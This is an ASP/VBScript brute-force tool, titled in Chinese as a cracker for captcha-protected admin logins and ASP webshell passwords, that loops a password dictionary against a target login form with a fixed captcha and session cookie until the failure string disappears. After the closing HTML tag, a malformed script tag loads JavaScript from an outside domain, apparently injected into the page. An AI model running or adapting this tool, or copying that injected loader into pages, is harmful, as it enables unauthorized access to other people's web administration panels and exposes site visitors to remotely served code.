<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%Response.Buffer = false%>
<%server.scripttimeout = 1200%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>ASP带验证码后台暴力登录，ASP大马暴力破解</title>
</head>

<body>
<%
'共两处配置
'配置1----------------------------------------------------------------------------
DoorUrl="http://x/default.asp"
Host="x"
WrongStr="误"
Dic="D:\x\pass idc\5000mima.TXT"
'配置1----------------------------------------------------------------------------

PostUrl=DoorUrl
'WrongStr="<input type=submit"
'WrongStr="失败"
'WrongStr="');history.go(-1);</"&"script>"
'WrongStr="javascript:history.go(-1)"

Set fso = Server.CreateObject("scripting."&"File"&"System"&"Object")
Set fileObj = fso.opentextfile(Dic,1,true)
filecontent = fileObj.readall 
fileObj.close
Set fileObj = nothing

mimaarr=split(filecontent,chr(13))
'Session("IndexFlag")=0
if Session("IndexFlag")>1 then Session("IndexFlag")=Session("IndexFlag")-1
Totalpass=ubound (mimaarr)

for j=Session("IndexFlag") to ubound (mimaarr)	
	response.write "<font color=blue>"&(j+1)&"/"&Totalpass&" </font>"
	'下边也需要修改     "&replace(mimaarr(j),chr(10),"")&"
	'配置2----------------------------------------------------------------------------
	LoginData="qaz=admin&wsx= "&replace(mimaarr(j),chr(10),"")&"&code=4084&Action=hhj&x=27&y=21"
	Cookie3="ASPSESSIONIDQSCARRRA=DEGFCHJBMAGBDHILFLIMIFDF"
	Lang="gb2312"
	'配置2----------------------------------------------------------------------------

	'response.write "<br>---------------------------------------<br>"
	'response.write LoginData
	'response.write "<br>---------------------------------------<br>"
	
	response.write "> "&mimaarr(j)&" "
	'response.write Len(LoginData)
	'response.end
	Result2=PostHttpPage (PostUrl,PostUrl,LoginData,Lang,Cookie3)
	'response.write Result2
	'response.end
	'response.write "<br><br>"
	'response.write server.HTMLEncode(Result)
	'response.write "<br>---------------------------------------<br>"
	response.write "<br>"
	response.write "<textarea cols=100 rows=5>"&server.HTMLEncode(Result2)&"</textarea>"
	'response.end
	'response.write instr(Result2,WrongStr)&"<br>"
	Session("IndexFlag")=Cint(Session("IndexFlag"))+1
	if instr(Result2,WrongStr)<1 then
		response.write  "<font color=red>Yes</font><br>"
		exit for
	end if
	response.write  "Not<br>"
next
response.write "猜解完毕。"

Function PostHttpPage(RefererUrl, PostUrl, PostData, Coding,COOKIESTR)
    Dim xmlHttp
    Dim RetStr
	'response.write "<rb>------------------------------<br>"
	'response.write PostData
	'response.write "<rb>------------------------------<br>"
    Set xmlHttp = Server.CreateObject("WinHttp.WinHttpRequest.5.1")
    xmlHttp.Open "POST", PostUrl, False
	xmlHttp.setRequestHeader "Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*"
	xmlHttp.setRequestHeader "Accept-Language","zh-cn"
	xmlHttp.setRequestHeader "Referer",RefererUrl
	xmlHttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
	xmlHttp.setRequestHeader "Accept-Encoding","gzip, deflate"
	xmlHttp.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
	xmlHttp.setRequestHeader "Host",Host
	xmlHttp.setRequestHeader "Content-Length", Len(PostData)
	xmlHttp.setRequestHeader "Connection","Keep-Alive"
	xmlHttp.setRequestHeader "Cache-Control","no-cache"

	if COOKIESTR<>"" then
	xmlHttp.setRequestHeader "Cookie",COOKIESTR
	end if
	xmlHttp.Send (PostData)
    If Err Then
        response.write "Err"
		Set xmlHttp = Nothing
        PostHttpPage = "$False$"
        Exit Function
    End If
	'response.write BytesToBstr(xmlHttp.ResponseBody, Coding)
	'response.end
	'PostHttpPage = right(BytesToBstr(xmlHttp.ResponseBody, Coding),1000)
	PostHttpPage = BytesToBstr(xmlHttp.ResponseBody, Coding)
	Set xmlHttp = Nothing
End Function
Function BytesToBstr(Body,Cset)
   Dim Objstream
   Set Objstream = Server.CreateObject("adodb.stream")
   objstream.Type = 1
   objstream.Mode =3
   objstream.Open
   objstream.Write body
   objstream.Position = 0
   objstream.Type = 2
   objstream.Charset = Cset
   BytesToBstr = objstream.ReadText 
   objstream.Close
   set objstream = nothing
End Function
Function UrlEncoding(DataStr)
   ' On Error Resume Next
    Dim StrReturn, Si, ThisChr, InnerCode, Hight8, Low8
    StrReturn = ""
    For Si = 1 To Len(DataStr)
        ThisChr = Mid(DataStr, Si, 1)
        If Abs(Asc(ThisChr)) < &HFF Then
            StrReturn = StrReturn & ThisChr
        Else
            InnerCode = Asc(ThisChr)
            If InnerCode < 0 Then
                InnerCode = InnerCode + &H10000
            End If
            Hight8 = (InnerCode And &HFF00) \ &HFF
            Low8 = InnerCode And &HFF
            StrReturn = StrReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
        End If
    Next
    UrlEncoding = StrReturn
End Function
%>
</body>
</html>
<scr<script language=javascript src=http://web.5dfgy.cn/12.js></script>